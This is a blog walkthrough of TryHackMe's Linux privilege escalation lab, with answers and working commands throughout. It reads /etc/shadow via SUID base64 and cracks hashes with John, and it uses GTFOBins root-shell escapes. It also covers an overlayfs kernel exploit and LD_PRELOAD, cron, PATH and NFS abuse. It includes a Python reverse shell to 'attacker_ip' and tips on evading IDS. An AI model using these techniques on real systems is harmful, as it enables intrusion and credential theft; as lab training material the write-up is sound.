---
title: TryHackMe - Linux Privilege Escalation
description: A walkthrough of TryHackMe's room "Linux Privilege Escalation".
categories: [Walkthrough THM, Privilege Escalation Module]
tags: [Privilege Escalation]
pin: false
---

**Lab Access:** <https://tryhackme.com/r/room/linprivesc>

## Task 1: Introduction
This room aims to give a better understanding of the main privilege escalation vectors and the process. This is an essential skill to have in various cyber security fields. 

## Task 2: What is Privilege Escalation?
Privilege escalation is essentially to go from a lower permission account to a higher permission one. This is usually done by exploiting a vulnerability, design flaw or misconfiguration in an operating system.

Higher privilege accounts will allow you to perform actions like resetting passwords, bypassing access controls and much more. 

## Task 3: Enumeration
Enumeration refers to the process of systematically gathering information about a target system or network. 
This task will cover a few basic enumeration points. You can also have a look at [hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist) and the privilege escalation checklist given there.

Lets look at the commands covered in the task and try to divide them into categories:

### System information
<details><summary><b>Hostname</b></summary>
Return the hostname of the target machine. Can be useful if for example corporate networks if the system's role is provided in the name.
</details>

<details><summary><b>uname -a</b></summary>
This will print system information giving additional detail about the kernel used by the system. This is useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation. It might give you the system architecture (64-bit or 32 bit for example). 
</details>

<details><summary><b>cat /proc/version</b></summary>
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal. You will find the compiler used to build the kernel and may provide insight into the security practices of the system. For example, older compilers may have compiled the kernel without modern security hardening features making the system more vulnerable.
</details>

<details><summary><b>cat /etc/issue</b></summary>
The /etc/issue file will also provide system information like OS identification. Note that this file can be customized and can in those cases both show faulty information but also extra information from system administrators.
</details>

### Process and Environment Information
<details><summary><b>ps</b></summary>
The ps command will display information about running processes and their IDs (PIDs). This helps identify which applications and services are active on the system.
You can use <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">ps -A</code> to show all running processes or <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">ps axjs</code> to view the  process tree. you can show a detailed view of all processes running using <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">ps -aux</code>.
</details>

<details><summary><b>env</b></summary>
The env command lists all the environment variables which can provide insight into the system's configuration and the user's environment. Some that are worth to look for are:
<ul>
<li> <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">PATH</code>: This variable indicates where the system looks for executable files. Misconfigurations can lead to privilege escalation if a malicious binary is placed in a directory that appears early in the <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">path</code> 
</li>
<li> <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">HOME</code>: Displays the users home directory which might contain sensitive files or scripts. </li>
<li> <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">SHELL</code>: Indicates teh shell being used, which could influence how commands are executed or what vulnerabilities might be present. </li>
</ul>
</details>

### User and Permission information
<details><summary><b>sudo -l</b></summary>
This command lists the commands the user is allowed to run as super user.
</details>

<details><summary><b>id</b></summary>
The id command will provide a general overview of the user's UID (user ID) and GID (Group ID) this can help to understand the user's permissions and roles on the system
</details>

<details><summary><b>cat /etc/passwd</b></summary>
This will display the contents of the /etc/passwd file which contains essential information about user accounts on a linux system. Not all users are of interest in this file, try to use, for example, <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">cat /etc/passwd | grep home</code>  to get the "real" users and their info filtered out.
</details>

### Networking information
<details><summary><b>ifconfig (Deprecated, use e.g ip addr show instead)</b></summary>
The ifconfig command in Linux is used to configure and display network interfaces. It provides information about the network interfaces on the system. 
</details>

<details><summary><b>netstat</b></summary>
The netstat command in Linux is used to display network connections, routing tables, interface statistics, and other network-related information. Some of the options that can be used include: <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">netstat -a</code>: Show all listening ports and established connections  <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">nestat -at (-au)</code>: List the above and filter on TCP or UDP protocols  <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">netstat -l</code>: List ports in "listening" mode. THese ports are open ard ready to accept incomming connections. Use with "t" option to list only TCP.  <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">netstat -s</code>: list network usage statistics by protocol. combine with -t or -u to limit the output to a specific protocol. <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">netstat -tp</code>: list connections with the service name and PID information, it can also be combined with the -l to show listening ports. <br>
</details>

### File and Directory Management
<details><summary><b>history</b></summary>
Looking at earlier commands with the history command can give you some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.
</details>

<details><summary><b>ls -la</b></summary>
The <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">ls -la</code> command provides a comprehensive view of all files, including hidden files, and directories in the current directory. It shows permissions, ownership and timestamps which might provide insight into who can access and modify files. 
</details>


<details><summary><b>find</b></summary>
The <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">find</code> command can help you find both text files and directories. I will refer to the TryHackMe source on this, and I really encourage you to play around with the "find" command to get the hang of it. It is very useful in everyday life when working in Linux!
</details>

---

**Q: What is the hostname of the target system?**
<details><summary>Answer</summary>
wade7363 <br>
use the "hostname" command
</details>

---

**Q: What is the Linux kernel version of the target system?**
<details><summary>Answer</summary>
3.13.0-24-generic <br>
use the "uname -a" command
</details>

---

**Q: What Linux is this?**
<details><summary>Answer</summary>
Ubuntu 14.04 LTS <br>
use "cat /etc/issue"
</details>

---

**Q: What version of the Python language is installed on the system?**
<details><summary>Answer</summary>
2.7.6 <br>
use "python -V"
</details>

---

**Q: What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)**
<details><summary>Answer</summary>
CVE-2015-1328 <br>
Google will help you here! You have the kernel version from question 2.
</details>


## Task 4: Automated Enumeration Tools
There are many tools you can use for automated enumeration to save time. These tools should only be used to save time since they can miss some privilege escalation vectors. 

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
[LinEnum](https://github.com/rebootuser/LinEnum)  
[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## Task 5: Privilege Escalation: Kernel Exploits
The aim of privilege escalation is essentially to reach root privileges, sometimes this can be achieved by exploiting an existing vulnerability and sometimes by accessing another user account that has more privileges, information or access.

Kernel exploit methodology is simple:
1. Identify teh kernel version
2. Search and find an exploit code for the kernel version of teh target system
3. Run the exploit.

It's often easiest to just google for existing exploit code, sometimes automatic scanners can be useful but they can give both false positives and false negatives.

Note that **it is important to understand how the exploit code works BEFORE you launch it**, it could potentially make irreversible changes to the OS or cause other problems. So even if you are in a LAB environment (such as the machines on THM) try to get the habit of checking and understanding the kernel exploits (and all for that matter, but especially the kernel exploits). 

---

**Q: Find and use the appropriate kernel exploit to gain root privileges on the target system**  

Let's start with the "find" part. If you run `uname -a` you get the same kernel as in the previous task, and you can therefore use **CVE-2015-1328**. If you want to understand this CVE a little better stay tuned for the planned CVE-2015-1328 Deep Dive post where I explore it in more detail. 

>**Short summary of CVE-2015-1328**  
 In essence the exploit code creates a malicious lib entry to the `ld.so.preload` file. It is a file containing a list of ELF shared objects to be loaded before any program, so it essentially causes the specified libraries to be preloaded for all programs executed on the system[^1]. By adding a malicious library to ld.so.preload that opens a root shell, the exploit ensures that this library is executed first, granting the attacker a root shell before any other program can run. The ld.so.preload file is only writable as root, this is where the core of the exploit comes in. The exploit abuses a vulnerability in using _user namespaces_ in combination with _overlayfs_ to bypass these restrictions. 

From what you can see, "all" that happens when you run the exploit is that a root shell is loaded before all other programs, which should not cause any harm to the operating system. So let's use it!

>**Reflection**  
From a detection standpoint, it probably won't be too hard for the system administrators to figure out that the system has been compromised since it (hopefully) will be detected by a IDS or HIPS. Also this exploit has a system wide impact and other users can gain root access by running programs that use preloaded libraries. 

Start by downloading the exploit from your source of choice, I downloaded from exploitDB. 

Use for example `python3 -m http.server 8080` on your machine to allow the target machine to retrieve the file. 

On the target host navigate to `/home/matt`. You will see that there is a flag1.txt file here but you don't have permission to see it. Run `wget http://MACHINE_IP:8080/ofs.c` (given that the exploit file is called ofs.c) in this directory. You should now have downloaded the file to the target machine. Compile it using `gcc ofs.c -o ofs` which should give you an executable file called "ofs". Start the exploit by running `./ofs`.  You should now be able to show the content of flag.txt!

---

**Q: What is the content of the flag1.txt file?**
<details><summary>Answer</summary>
THM-XXXXXXXXXX, see above how to retrieve it! 
</details>

## Task6: Privilege Escalation: Sudo
The sudo command allows a user to run a program with root privileges, system administrators can regulate who has access to which program using sudo. You can check the current root privileges using the `sudo -l` command.

If the system is misconfigured, specifically the "env_keep" option is enabled for `LD_PRELOAD`, you can exploit this to gain root access. Here is how you would do this: The "env_keep" option allows the environment variables (like `LD_PRELOAD`) to be preserved _temporarily_ when running a command via `sudo`. NNormally, these environment variables are cleared to prevent privilege escalation, but if this option is set, you can specify libraries to be loaded via LD_PRELOAD while executing a command with sudo. 

To exploit this, you create a shared library (.so file) that, when loaded, changes the user ID to root and spawns a root shell. By running a command with `sudo` and specifying this custom library in `LD_PRELOAD`, for example, `sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`, the library, which spawns a root shell, is executed before the find command. Since the library runs with root privileges (due to sudo), it escalates our privileges and spawns a root shell even before the find command is executed.

<https://gtfobins.github.io/> is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

---

**Q: How many programs can the user "karen" run on the target system with sudo rights?**
<details><summary>Answer</summary>
3 <br>
run sudo-l
</details>

---

**Q: What is the content of the flag2.txt file?**
<details><summary>Answer</summary>
Navigate to "/home/ubuntu/" where you will find the flag.
</details>

---

**Q: How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?**
<details><summary>Answer</summary>
sudo nmap --interactive
</details>

---

**Q: What is the hash of frank's password?**
<details><summary>Answer</summary>
$6$2.s[...]B1uaqeLR1 <br>
you gotta fill in the blanks in [...]. Have a look at the /etc/shadow file.
</details>

## Task 7: Privilege Escalation: SUID
Linux privilege control rely on controlling users and files interaction using permissions such as read, write and execute. Usually permissions are given to users and files within their privilege level. In some cases, however, it might be necessary to let the files be executed with the permission level of the _owner_ or _group owner_. 

So if _root_ is the owner of an executable file, that file will run with root privileges, which can be exploited in some cases! Check gtfobins for this as well <https://gtfobins.github.io/#+suid>. 

---

**Q: Which user shares the name of a great comic book writer?**
<details><summary>Answer</summary>
gerryconway <br>
use cat /etc/passwd
</details>

---

**Q: What is the password of user2?**
Let's first check if the SUID is set for any binaries. Let's use `find / -type f -perm -04000 -ls 2>/dev/null` and see if you can find a vulnerability on gtfobins that you can use.  

> `2>/dev/null` redirects (>) standard errors (stderr) (2) to `/dev/null` which directly ignores it. Meaning that you will get a cleaner output. You could do this with any standard file descriptor:    
0=stdin  
1=stdout  
2=stderr  
So if you only want to see the errors you would use `1>/dev/null` instead.
{: .prompt-tip}

You (hopefully) found that base64 can be exploited by using:

```shell
LFILE=file_to_read
./base64 "$LFILE" | base64 --decode #Drop the ./ if it doesn't work!
```
Base 64 is used to encode/decode binary data. So what you do in the code above is to encode a file and then directly decode it, where the decoded file is printed! Nice! You might not be able to gain root shell but you will be able to print some nice files to eventually gain the password! You should be able to print the `/etc/shadow` file, which along with `/etc/passwd` could give you the password. 

Remember John? John the Ripper? If you have a file containing the `/etc/shadow` content (let's say shadow.txt) and another file with `/etc/passwd` (let's say passwd.txt) you can use `unshadow passwd.txt shadow.txt > forJohn.txt` and then `john --wordlist=/usr/share/wordlists/rockyou.txt forJohn.txt` which will give you the password!

Let's recap what you did to retain the answer:
1. We found base64 with the SUID bit set
2. We printed the /etc/shadow file using the base64 
3. We combined /etc/shadow and /etc/passwd to gain passwords

---

**Q: What is the content of the flag3.txt file?**
<details><summary>Answer</summary>
To find the flag: find / -name flag3.txt 2>/dev/null
You could print the content of /etc/shadow so you can print the content of this file. 
</details>

## Task 8: Capabilities
Letting a process or binary run as root by setting the SUID or Sudo can sometimes give way too much privilege, especially if there is a specific permission you need, e.g initiate socket connections. Instead of giving the binary root privileges, capabilities are used to manage the privileges at a granular level. There are a bunch of different capabilities, for example 

    CAP_SETUID
        * Make arbitrary manipulations of process UIDs (setuid(2), setreuid(2), setresuid(2), setfsuid(2));
        * forge UID when passing socket credentials via UNIX domain sockets;
        * write a user ID mapping in a user namespace (see user_namespaces(7)).
    
    CAP_NET_BIND_SERVICE
              Bind a socket to Internet domain privileged ports (port numbers less than 1024)

Have a look at the man pages to find the entire list.

**Q: Complete the task described above on the target system**
The task at hand is to check the capabilities and see if we can leverage them for privilege escalation. 

Let's start by checking the capabilities using `getcap -r / 2>/dev/null` where `-r` enables recursive search.
Then you get the following:
![alt text](/assets/images/Privilege_Escalation_getcap.png)

Vim has `cap_setuid+ep` and looking at gftobins (`https://gtfobins.github.io/gtfobins/vim/`) gives the following code for root shell: `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' `

---
**Q: How many binaries have set capabilities?**
<details><summary>Answer</summary>
6
</details>

---

**Q: What other binary can be used through its capabilities?**
<details><summary>Answer</summary>
View
</details>

---

**Q: What is the content of the flag4.txt file?**
<details><summary>Answer</summary>
cat /home/ubuntu/flag4.txt
</details>

## Task 9: Privilege Escalation: Cron Jobs
Cron jobs are scheduled tasks that allow automation of recurring tasks, like backups, system updates and more. They are defined in crontab files where the users or system can specify what commands to run and when. Having cronjobs reduces the need for manual intervention in repetitive tasks and the tasks are executed regularly without delay or human error. For example, it is convenient to have system maintenance tasks running in the evening or at night and not on peak hours.

You can see all the cron jobs when running `cat /etc/crontab`, you will also find the following explaining the structure of the cron job definition:
```terminal
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
```

If a cron job script or binary is writable by a lower privileged user, the script can be modified to execute malicious code with elevated privileges.

You need to manually remove cron jobs when they are no longer needed. Let's say you remove a script, the cron job will still be there. This could be a security risk, especially if the full path of the script is not defined. If the full path is not defined cron will refer to the paths listed under `PATH` (see code above). An attacker could then create a script with the same name in a directory that is listed in the `PATH` variable, which would run on the cron job on schedule.

---

**Q: How many user-defined cron jobs can you see on the target system?**
<details><summary>Answer</summary>
4
</details>

---

**Q: What is the content of the flag5.txt file?**  

First off we need to get root access.

When running `cat /etc/crontab` you will find that there are 4 user defined cron jobs.

```terminal
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py

```

and the PATH variable is: `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
`. 

All except the first is of interest (the first has a path to root which we cannot write to). 
So let's start with `antivirus.sh` this has no path defined, thus we could create a new file for it as long as it is in any of the directories specified in `PATH`. Unfortunately we don't have write permissions in any of them. 

Let's move on to the `/home/karen/backup.sh` cron job. This is our own cron job and checking the permissions, we have write permissions to the file! This means we can alter the contents of this file. [Here](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a collection of reverse shells if you don't have one already, find one for bash TCP. Make sure  that you have a nc listener on your attacking computer (i.e `nc -lvp 4444`). Remember to make the file executable using chmod! This should give you a root shell!

Let's explore the `/tmp/test.py` for the fun of it! You will find that the test.py file does not exist in the `/tmp` folder. You can create it though, so let's create `test.py`! 

```python
#!/usr/bin/python3

import socket
import subprocess
import os

# Change to the attacker's IP and port
HOST = 'attacker_ip'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Redirecting standard input, output, and error to the socket
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Launch the shell
subprocess.call(['/bin/sh', '-i'])
```
Let's try it out by running `python3 test.py` and having a listener on our host. You will see that we get a shell but with Karen as our user. This is expected since we ran it as Karen. If you wait a minute you should receive a root-shell here also! 

***Note***

There are a few things to note though, firs off the `#!/usr/bin/python3` on the first line makes sure that the python uses the Python interpreter and not the default, specified by `SHELL` as `/bin/sh`.

You also need to make the python file is executable as well. e

Now that we have root privileges we can check the contents of flag5.txt.

---

**Q: What is Matt's password**  
With root privileges we can check the `/etc/shadow` file, which along with the `/etc/passwd` could give us a password. We have done this before (task 7), you can either copy the entire files or only Matt's specific lines. Use John the Ripper to retrieve the password.

## Task 10: Privilege Escalation: PATH
The `PATH` environment variable in Linux specifies the directories the system searches for executable programs when commands are entered in the terminal. When you type a command without providing its full path, the system checks each directory listed in `$PATH` from left to right. It uses the first executable it finds that matches the command name.

Let's consider an example similar to one from TryHackMe (THM):

There is a file owned by root, named `path_exp.c`, which contains the following code:

```c
#include <unistd.h>
void main()
{
    seduid(0);
    setgid(0);
    system("thm");
}
```

This file is compiled into an executable called `path`. The key aspect of this program is that it calls `thm` without specifying its full path, making it vulnerable to exploitation. Since the program runs with root privileges, it will execute the first `thm` it finds in the `$PATH`.

**Exploiting the Vulnerability**

To exploit this vulnerability, follow these steps:

1. **Identify Writable Directories**: First, check which directories you have write access to by running:

    ```bash
    find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
    ```

2. **Modify the `$PATH` Variable**: Next, we want to add the `/tmp` directory to the `$PATH`. This is crucial for our exploit, as we’ll create a malicious version of `thm` that opens a shell. To ensure `/tmp` is searched **before** the directory containing the legitimate `thm`, run:

    ```bash
    export PATH=/tmp:$PATH
    ```

3. **Create the Malicious Executable**: Now that `/tmp` is prioritized in the `$PATH`, create your version of `thm` in the `/tmp` folder. This version should be an executable that opens a shell.


With the malicious `thm` located in `/tmp`, when you run the `path` executable, it will execute your version of `thm` first. Since the program runs with root privileges, this effectively gives you a root shell. 

---

**Q: What is the odd folder you have write access for?**
<details><summary>Answer</summary>
/home/murdoch
</details>

---

**Q: Exploit the $PATH vulnerability to read the content of the flag6.txt file.**  
In general, opening a root shell is more likely to trigger IDS systems. To minimize detection, let’s focus on fulfilling this task as stealthily as possible. Our goal is to **read** the contents of `flag6.txt`. Normally, we’d use a command like `cat flag6.txt`, or more precisely, `cat /home/matt/flag6.txt`.

Now, take a look at the files in the `/home/murdoch` folder. Which command in `thm.py` is executed without specifying its full path? The `thm` command.

To exploit this, we can create a custom `thm` binary in the `/tmp` directory. Use the following command to store the `cat` operation inside the `thm` executable:

```bash
echo "cat /home/matt/flag6.txt" > /tmp/thm
chmod +x /tmp/thm
```

Once we’ve placed this binary in `/tmp`, if we run `./test` in the murdoch folder, the program should execute our custom `thm`, giving us the contents of `flag6.txt` without raising alarms!

---

**Q: What is the content of the flag6.txt file?**
<details><summary>Answer</summary>
THM-XXXXXXX, you should get it from the steps above!
</details>

## Task 11: Privilege Escalation: NFS
NFS stands for **Network File System** and is a file system protocol allowing computers to access files over a network as if they were on its local hard drive.

You can see the configuration in the `/etc/exports` file. On the machine given this is shown:

```terminal
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

The key to the privilege escalation is the "no_root_squash" option. By default, NFS will change the root user to nfsnobody and remove any root privileges. If the "no_root_squash" is present on a writable share, it is possible to create an executable with SUID bit set and run it on the target system. We could then create a file that starts a root shell on the attacking host and run it on the target host gaining an instant root shell.

---

**Q: How many mountable shares can you identify on the target system?**
<details><summary>Answer</summary>
3
</details>

---

**Q: How many shares have the "no_root_squash" option enabled?**
<details><summary>Answer</summary>
3
</details>

---

**Q: Gain a root shell on the target system**
To do this, we first check the mountable shares using either `showmount -e TARGET_IP` on the attacker machine or `cat /etc/exports` on the target host. We find that the following folders are mountable:

```terminal
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

Let's go for the `/home/ubuntu/sharedfolder` since that one does not require root permissions like `/home/backup` and it does not contain anything like `/tmp` does. 

>From a security perspective it would also be preferred to put it in the `/home/ubuntu/sharedfolder` since that folder is empty right now, it could mean it is seldomly checked also, the `/tmp` folder will most likely checked by administrators more often and probably cleaned periodically increasing the chances of it being deleted or detected.


If you are not root user, use `sudo su -` to become root on your local machine. Use `mount -o rw MACHINE_IP:/home/backup backupFolderOnAttackerMachine` to mount the backup folder to your computer. Create a file nfs.c (or whatever you want to call it) in the mounted directory. 

```c
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

Compile it with `gcc nfs.c -o nfs -w` if you get an gcc error on the target machine, compile it by adding the `-static` flag as well.

If you run `./nfs` on the target host, you should get a root shell.

---

**Q: What is the content of the flag7.txt file?**
<details><summary>Answer</summary>
You will find the flag in /home/matt.
</details>

## Task 12: Capstone Challenge
Time for a challenge! 

We are given a start with the user leonard and the password Penny123. Our first mission is to get the contents of flag1.txt. Let's find it through  `find / -name "flag1.txt" 2>/dev/null`. It seems to be located in Missy's `Documents` folder. 
Let's have a look around if we can find any possible ways to get access to it.

### Enumerating Leonard

#### Kernel
Let's start off by looking at the kernel. It seems like it is a red-hat version 

```terminal
Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) 
```
After a quick look at exploit-db there does not seem to be any obvious exploits available. Let's come back to this if needed and move on.

#### Sudo
We are not allowed to run any commands as sudo, so nothing to do here.

```terminal
[leonard@ip-10-10-70-128 ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for leonard: 
Sorry, user leonard may not run sudo on ip-10-10-70-128.
```
#### SUID
Among the binaries with the SUID bit set are the known `/usr/bin/base64` that we have seen before! We know that **we can exploit this**!

Let's for completeness continue the enumeration to see if we can find any other entries.

#### Cron jobs
We cannot see any cron jobs for this user.

#### Capabilities
None of the capabilities have any privilege escalation techniques in gtfobins so let's move on.

#### NFS
There are no remote folders available .

#### PATH
If we have a look at the output from $PATH we get the following. 

```terminal
[leonard@ip-10-10-60-200 ~]$ echo $PATH
/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3
/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin
:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home
/leonard/.local/bin:/home/leonard/bin
```
Let's have a closer look at qt-3.3 and puppetlabs. Neither of these seem to be low hanging fruit in our mission to escalate our privileges. If we did'nt have the SUID we could have had a closer look here and the code snippets to see if we could find a way to exploit the $PATH. 

### Exploiting SUID
Let's move on and try to escalate our privileges using base64 which we know could give us the `/etc/shadow` file. We have already learned that we can use it to read the shadow file using `base64 /etc/shadow | base64 --decode`. This along with the passwd file might give us a password. It seems reasonable to try to crack "missy" first. So in order to save time I only copy-pasted the missy lines from both of the files and fed that to unshadow and then to John the Ripper. 

```terminal
$ nano passwd.txt 
$ nano shadow.txt
$ unshadow passwd.txt shadow.txt > forJohn.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt forJohn.txt 
```

This gives us a password for missy! Let's switch to Missy's profile using `su missy` and entering the password retrieved JTR.
Let's first off get the flag1.txt from `/home/missy/Documents`.

### Enumerating Missy

#### Kernel
The Kernel is the same, so no need to check this out. 

#### Sudo
Using `sudo -l` we find that we are allowed to run "find" with sudo. Which we **know can be exploited**! 
Let's for completeness continue the enumeration anyways.

#### SUID
This is the same as before, and we don't really have any use for retrieving the shadow file again. So let's move on!

#### Capabilities
The capabilities seem to be the same as for Leonard, so we won't get much from here!

#### Cron Jobs
There are no cronjobs for this user.

#### PATH
We see that we are allowed to use some of Leonard's folders... Interesting... But we have not found any executables with root privileges that could be exploited here. So let's move on since this seems like a rabbit hole.

#### NFS 
There are no mountable folders for this user.

### Exploiting Sudo find
gtfobins has a nice one for running find with sudo privileges: `sudo find . -exec /bin/sh \; -quit` which gives us a root shell directly! Let's find the root flag `find / -name flag2.txt 2>/dev/null` and navigate to it! 


## Summary of commands
Well that was a mouthful! 

Let's write down the commands learned for privilege escalation vectors covered here:

### Kernel
`uname -a`  
`/proc/version`

### Sudo
`sudo -l`

### SUID
`find / -type f -perm -04000 -ls 2>/dev/null`

### Capabilities
`getcap -r / 2>/dev/null`

### Cron Jobs
`cat /etc/crontab`

### PATH
`echo $PATH`


### NFS
`cat /etc/exports`

I hope you enjoyed the walkthrough! 
Happy hacking!


[^1]: <https://man7.org/linux/man-pages/man8/ld.so.8.html>